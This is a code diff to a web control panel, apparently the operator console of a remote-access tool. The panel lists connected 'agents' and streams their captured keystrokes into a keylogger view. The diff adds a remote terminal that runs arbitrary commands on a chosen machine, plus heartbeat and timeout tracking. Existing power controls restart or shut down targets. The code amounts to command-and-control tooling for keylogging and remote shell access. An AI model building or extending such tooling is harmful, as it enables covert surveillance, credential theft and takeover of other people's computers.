@@ -31,6 +31,9 @@
             <button class="nav-link" id="keylog-tab" data-bs-toggle="tab" data-bs-target="#keylog" type="button" role="tab">Keylogger & Files</button>
         </li>
         <li class="nav-item" role="presentation">
+            <button class="nav-link" id="terminal-tab" data-bs-toggle="tab" data-bs-target="#terminal" type="button" role="tab">Terminal</button>
+        </li>
+        <li class="nav-item" role="presentation">
             <button class="nav-link text-danger" id="power-tab" data-bs-toggle="tab" data-bs-target="#power" type="button" role="tab">Power Controls</button>
         </li>
     </ul>
@@ -154,6 +157,21 @@
                 </div>
             </div>
         </div>
+
+        <!-- Terminal Tab -->
+        <div class="tab-pane fade" id="terminal" role="tabpanel">
+            <div class="card">
+                <div class="card-header bg-dark text-white text-monospace">Remote Terminal Shell</div>
+                <div class="card-body bg-dark text-white border-top border-secondary">
+                    <pre id="terminal-output" class="mb-3" style="height: 300px; overflow-y: auto; font-family: 'Consolas', 'Courier New', monospace; white-space: pre-wrap; color: #0f0;">> Ready for commands...</pre>
+                    <div class="input-group">
+                        <span class="input-group-text bg-secondary text-white border-secondary">&gt;</span>
+                        <input type="text" id="terminal-input" class="form-control bg-dark text-white border-secondary" placeholder="Enter command (e.g. ipconfig)" onkeypress="handleTerminalKeyPress(event)">
+                        <button class="btn btn-outline-success" type="button" onclick="executeTerminalCommand()">Run</button>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
 </div>
 
@@ -179,12 +197,20 @@
 
         // Hub Listeners
         connection.on("ReceiveConnectedAgents", function(jsonArray) {
-            connectedAgents = JSON.parse(jsonArray);
+            let agents = JSON.parse(jsonArray);
+            connectedAgents = agents.map(a => ({...a, lastHeartbeat: Date.now()}));
             renderAgentList();
         });
         connection.on("AgentConnected", function (connectionId, machineName) {
             console.log("Agent Connected: " + machineName);
-            connectedAgents.push({ id: connectionId, name: machineName });
+            
+            // Check if already in list to avoid duplicates
+            let existing = connectedAgents.find(a => a.id === connectionId);
+            if (!existing) {
+                connectedAgents.push({ id: connectionId, name: machineName, lastHeartbeat: Date.now() });
+            } else {
+                existing.lastHeartbeat = Date.now();
+            }
             renderAgentList();
         });
 
@@ -199,15 +225,51 @@
             renderAgentList();
         });
 
+        connection.on("ReceiveAgentHeartbeat", function(connectionId) {
+            let agent = connectedAgents.find(a => a.id === connectionId);
+            if(agent) {
+                agent.lastHeartbeat = Date.now();
+                renderAgentList(); // Re-render to show heartbeat indication if needed
+            }
+        });
+
+        // Background check for 60s timeout
+        setInterval(function() {
+            let now = Date.now();
+            let changed = false;
+            for(let i = connectedAgents.length - 1; i >= 0; i--) {
+                let agent = connectedAgents[i];
+                if (agent.lastHeartbeat && (now - agent.lastHeartbeat > 60000)) {
+                    console.log("Agent timeout: " + agent.name);
+                    connectedAgents.splice(i, 1);
+                    changed = true;
+                    if (currentTargetId === agent.id) {
+                        currentTargetId = null;
+                        document.getElementById('control-panel').classList.add('d-none');
+                        document.getElementById('welcome-alert').classList.remove('d-none');
+                    }
+                }
+            }
+            if (changed) renderAgentList();
+        }, 5000);
+
         // UI Helpers
         function renderAgentList() {
             const list = document.getElementById("pc-list");
             list.innerHTML = "";
+            let now = Date.now();
+            
             connectedAgents.forEach(agent => {
                 const li = document.createElement("li");
                 li.className = "nav-item";
+                
+                // Show online status: < 30s = Online (success), > 30s = Away (warning)
+                let isAway = agent.lastHeartbeat && (now - agent.lastHeartbeat > 30000);
+                let badgeClass = isAway ? "bg-warning" : "bg-success";
+                let statusText = isAway ? "Away" : "Online";
+
                 li.innerHTML = `<a class="nav-link ${agent.id === currentTargetId ? 'active' : ''}" href="#" onclick="selectAgent('${agent.id}', '${agent.name}')">
-                    🖥️ ${agent.name} <span class="badge bg-success float-end">Online</span>
+                    🖥️ ${agent.name} <span class="badge ${badgeClass} float-end">${statusText}</span>
                 </a>`;
                 list.appendChild(li);
             });
@@ -319,7 +381,19 @@
 
         connection.on("ReceiveKeylog", function(targetId, keys) {
             const consoleEl = document.getElementById("keylog-console");
-            consoleEl.textContent += keys;
+            let currentText = consoleEl.textContent;
+            
+            for(let i = 0; i < keys.length; i++) {
+                if (keys[i] === '\b') {
+                    if (currentText.length > 0) {
+                        currentText = currentText.slice(0, -1);
+                    }
+                } else {
+                    currentText += keys[i];
+                }
+            }
+            
+            consoleEl.textContent = currentText;
             consoleEl.scrollTop = consoleEl.scrollHeight; // Auto-scroll to bottom
         });
 
@@ -357,5 +431,34 @@
                 else if (cmd === 'Restart') connection.invoke("RestartDevice", currentTargetId).catch(err => console.error(err));
             }
         }
+
+        // --- TERMINAL ---
+        function handleTerminalKeyPress(e) {
+            if (e.key === 'Enter') {
+                executeTerminalCommand();
+            }
+        }
+
+        function executeTerminalCommand() {
+            if(!currentTargetId) return;
+            const inputEl = document.getElementById("terminal-input");
+            const command = inputEl.value.trim();
+            if(!command) return;
+
+            const outEl = document.getElementById("terminal-output");
+            outEl.textContent += `\n> ${command}\nRunning...`;
+            inputEl.value = "";
+
+            connection.invoke("RequestExecuteCommand", currentTargetId, command).catch(err => {
+                outEl.textContent += `\nError: ${err}`;
+            });
+        }
+
+        connection.on("ReceiveTerminalOutput", function(targetId, output) {
+            const outEl = document.getElementById("terminal-output");
+            outEl.textContent = outEl.textContent.replace("Running...", "");
+            outEl.textContent += `\n${output}\n`;
+            outEl.scrollTop = outEl.scrollHeight;
+        });
     </script>
 }
